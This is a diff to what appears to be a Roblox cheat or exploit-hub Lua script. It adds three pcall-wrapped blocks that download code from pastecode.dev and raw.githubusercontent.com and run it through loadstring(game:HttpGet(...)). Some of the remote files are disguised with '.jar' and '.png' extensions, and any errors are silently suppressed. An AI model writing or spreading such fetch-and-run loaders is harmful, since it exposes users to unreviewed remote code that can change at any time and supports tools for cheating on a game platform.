@@ -4409,13 +4409,21 @@ local MoreSection = More:NewSection("no")
 MoreSection:NewKeybind("Toggle ui", "toggle the ui yes", Enum.KeyCode.Insert, function()
 Library:ToggleUI()
 end)
---loadstring(game:HttpGet("https://pastecode.dev/raw/hzt2u41z/EYEgottrolled_getgenv.jar",true))()
---sumthing
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/uNb6892M/main/pastebin.com.uNb6892M",true))();
 
+-- eye
+pcall(function()
+    loadstring(game:HttpGet("https://pastecode.dev/raw/hzt2u41z/EYEgottrolled_getgenv.jar", true))()
+end)
 
+-- main lollypop notif
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/uNb6892M/main/pastebin.com.uNb6892M", true))()
+end)
+
+pcall(function()
 -- [ TOGGLE klose/open ] --
 loadstring(game:HttpGet("https://pastecode.dev/raw/9um0ynui/toggle_lulaslollipop.png", true))()
+end)
 
 
 ---end---
